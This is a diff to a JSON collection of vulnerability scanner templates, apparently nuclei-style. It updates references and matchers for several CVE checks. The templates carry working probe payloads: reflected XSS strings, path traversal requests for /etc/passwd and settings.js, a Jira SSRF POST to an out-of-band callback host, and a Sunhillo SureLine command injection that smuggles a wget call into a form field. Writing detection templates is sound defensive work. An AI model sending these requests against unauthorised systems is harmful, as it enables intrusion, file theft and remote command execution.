@@ -3161,8 +3161,9 @@
       "id": "CVE-2016-1000128",
       "info": {
         "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin anti-plagiarism v3.60",
         "name": "anti-plagiarism <= 3.60 - Reflected Cross-Site Scripting (XSS)",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000128",
+        "reference": "- http://www.vapidlabs.com/wp/wp_advisory.php?v=161\n- https://wordpress.org/plugins/anti-plagiarism\n",
         "severity": "medium",
         "tags": "cve,cve2016,wordpress,xss,wp-plugin"
       },
@@ -8304,7 +8305,7 @@
         "author": "pikpikcu",
         "description": "The SSI printenv command in Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and\n7.0.0 to 7.0.93 echoes user provided data without escaping and is,\ntherefore, vulnerable to XSS. SSI is disabled by default.\nThe printenv command is intended for debugging and is unlikely to be present in a production website.\n",
         "name": "Apache Tomcat XSS",
-        "reference": "- https://seclists.org/fulldisclosure/2019/May/50\n- https://wwws.nightwatchcybersecurity.com/2019/05/27/xss-in-ssi-printenv-command-apache-tomcat-cve-2019-0221/\n",
+        "reference": "- https://seclists.org/fulldisclosure/2019/May/50\n- https://wwws.nightwatchcybersecurity.com/2019/05/27/xss-in-ssi-printenv-command-apache-tomcat-cve-2019-0221/\n- https://www.exploit-db.com/exploits/50119\n",
         "severity": "low",
         "tags": "cve,cve2019,apache,xss"
       },
@@ -8334,7 +8335,8 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E"
+            "{{BaseURL}}/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E",
+            "{{BaseURL}}/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E"
           ]
         }
       ]
@@ -9555,7 +9557,7 @@
         "author": "daffainfo",
         "description": "In the api-bearer-auth plugin before 20190907 for WordPress, the server parameter is not correctly filtered in the swagger-config.yaml.php file, and it is possible to inject JavaScript code, aka XSS.",
         "name": "API Bearer Auth <= 20181229 - Reflected Cross-Site Scripting (XSS)",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-16332",
+        "reference": "- https://plugins.trac.wordpress.org/changeset/2152730\n- https://wordpress.org/plugins/api-bearer-auth/#developers\n",
         "severity": "medium",
         "tags": "cve,cve2019,wordpress,xss,wp-plugin"
       },
@@ -10450,7 +10452,9 @@
       "id": "CVE-2019-3401",
       "info": {
         "author": "TechbrunchFR,milo2012",
+        "description": "The ManageFilters.jspa resource in Jira before version 7.13.3 and from version 8.0.0 before version 8.1.1 allows remote attackers to enumerate usernames via an incorrect authorisation check.",
         "name": "Atlassian JIRA Information Exposure (CVE-2019-3401)",
+        "reference": "https://jira.atlassian.com/browse/JRASERVER-69244",
         "severity": "info",
         "tags": "cve,cve2019,jira,atlassian"
       },
@@ -11077,28 +11081,29 @@
         "author": "TechbrunchFR",
         "description": "The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class.",
         "name": "JIRA SSRF in the /plugins/servlet/gadgets/makeRequest resource",
-        "reference": "- https://www.tenable.com/blog/cve-2019-8451-proof-of-concept-available-for-server-side-request-forgery-ssrf-vulnerability-in\n- https://jira.atlassian.com/browse/JRASERVER-69793\n",
+        "reference": "- https://www.tenable.com/blog/cve-2019-8451-proof-of-concept-available-for-server-side-request-forgery-ssrf-vulnerability-in\n- https://jira.atlassian.com/browse/JRASERVER-69793\n- https://hackerone.com/reports/713900\n",
         "severity": "medium",
-        "tags": "cve,cve2019,atlassian,jira,ssrf"
+        "tags": "cve,cve2019,atlassian,jira,ssrf,oob"
       },
       "requests": [
         {
+          "body": "url=https://{{Hostname}}:443@{{interactsh-url}}\n",
           "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
             "X-Atlassian-token": "no-check"
           },
           "matchers": [
             {
-              "name": "ssrf-response-body",
-              "part": "body",
+              "part": "interactsh_protocol",
               "type": "word",
               "words": [
-                "<p>This domain is for use in illustrative examples in documents."
+                "http"
               ]
             }
           ],
-          "method": "GET",
+          "method": "POST",
           "path": [
-            "{{BaseURL}}/plugins/servlet/gadgets/makeRequest?url=https://{{Hostname}}:1337@example.com"
+            "{{BaseURL}}/plugins/servlet/gadgets/makeRequest"
           ]
         }
       ]
@@ -15026,7 +15031,15 @@
             {
               "part": "body",
               "regex": [
-                "^= ([0-4]\\.[0-9\\.]+|5\\.[0-2]|5\\.[0-2]\\.[0-9]+|5\\.3\\.[0-1]) ="
+                "^== Changelog ==\""
+              ],
+              "type": "regex"
+            },
+            {
+              "negative": true,
+              "part": "body",
+              "regex": [
+                "^= (5\\.3\\.[2-9]+|5\\.[4-9]+\\.|[6-9]\\.[0-9]+\\.[0-9]+|1[0-9]+\\.) ="
               ],
               "type": "regex"
             }
@@ -17413,7 +17426,7 @@
         "author": "lotusdll",
         "description": "The BuddyPress WordPress plugin was affected by an REST API Privilege Escalation to RCE",
         "name": "BuddyPress REST API Privilege Escalation to RCE",
-        "reference": "- https://github.com/HoangKien1020/CVE-2021-21389\n- https://nvd.nist.gov/vuln/detail/CVE-2021-21389\n",
+        "reference": "- https://github.com/HoangKien1020/CVE-2021-21389\n- https://buddypress.org/2021/03/buddypress-7-2-1-security-release/\n- https://codex.buddypress.org/releases/version-7-2-1/\n- https://github.com/buddypress/BuddyPress/security/advisories/GHSA-m6j4-8r7p-wpp3\n",
         "severity": "critical",
         "tags": "cve,cve2021,wordpress,wp-plugin,rce"
       },
@@ -18304,7 +18317,7 @@
         "author": "daffainfo",
         "description": "The Bello - Directory & Listing WordPress theme before 1.6.0 did not properly sanitise and escape its listing_list_view, bt_bb_listing_field_my_lat, bt_bb_listing_field_my_lng, bt_bb_listing_field_distance_value, bt_bb_listing_field_my_lat_default, bt_bb_listing_field_keyword, bt_bb_listing_field_location_autocomplete, bt_bb_listing_field_price_range_from and bt_bb_listing_field_price_range_to parameter in ints listing page, leading to reflected Cross-Site Scripting issues.",
         "name": "Bello WordPress Theme < 1.6.0 - Reflected Cross-Site Scripting (XSS)",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-24320",
+        "reference": "- https://m0ze.ru/vulnerability/%5B2021-03-21%5D-%5BWordPress%5D-%5BCWE-79%5D-Bello-WordPress-Theme-v1.5.9.txt\n- https://wpscan.com/vulnerability/6b5b42fd-028a-4405-b027-3266058029bb\n",
         "severity": "medium",
         "tags": "cve,cve2021,wordpress,xss,wp-plugin"
       },
@@ -20138,6 +20151,13 @@
                 "name:",
                 "pass:"
               ]
+            },
+            {
+              "negative": true,
+              "type": "word",
+              "words": [
+                "html>"
+              ]
             }
           ],
           "matchers-condition": "and",
@@ -20178,7 +20198,7 @@
     {
       "id": "CVE-2021-3223",
       "info": {
-        "author": "gy741",
+        "author": "gy741,pikpikcu",
         "description": "Node-RED-Dashboard before 2.26.2 allows ui_base/js/..%2f directory traversal to read files.",
         "name": "Node RED Dashboard - Directory Traversal",
         "reference": "- https://github.com/node-red/node-red-dashboard/issues/669\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3223\n",
@@ -20189,15 +20209,25 @@
         {
           "matchers": [
             {
+              "part": "body",
               "regex": [
                 "root:.*:0:0:"
               ],
               "type": "regex"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Node-RED web server is listening"
+              ]
             }
           ],
+          "matchers-condition": "or",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+            "{{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "{{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2fsettings.js"
           ]
         }
       ]
@@ -20629,6 +20659,33 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/openam/oauth2/..;/ccversion/Version"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-36380",
+      "info": {
+        "author": "gy741",
+        "description": "The /cgi/networkDiag.cgi script directly incorporated user-controllable parameters within a shell command, allowing an attacker to manipulate the resulting command by injecting valid OS command input. The following POST request injects a new command that instructs the server to establish a reverse TCP connection to another system, allowing the establishment of an interactive remote shell session.",
+        "name": "Sunhillo SureLine - Unauthenticated OS Command Injection",
+        "reference": "- https://research.nccgroup.com/2021/07/26/technical-advisory-sunhillo-sureline-unauthenticated-os-command-injection-cve-2021-36380/\n",
+        "severity": "critical",
+        "tags": "cve,cve2021,sureline,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /cgi/networkDiag.cgi HTTP/1.1\nHost: {{Hostname}}\n\ncommand=2&ipAddr=&dnsAddr=$(wget+http://{{interactsh-url}})&interface=0&netType=0&scrFilter=&dstFilter=&fileSave=false&pcapSave=false&fileSize=\n"
           ]
         }
       ]
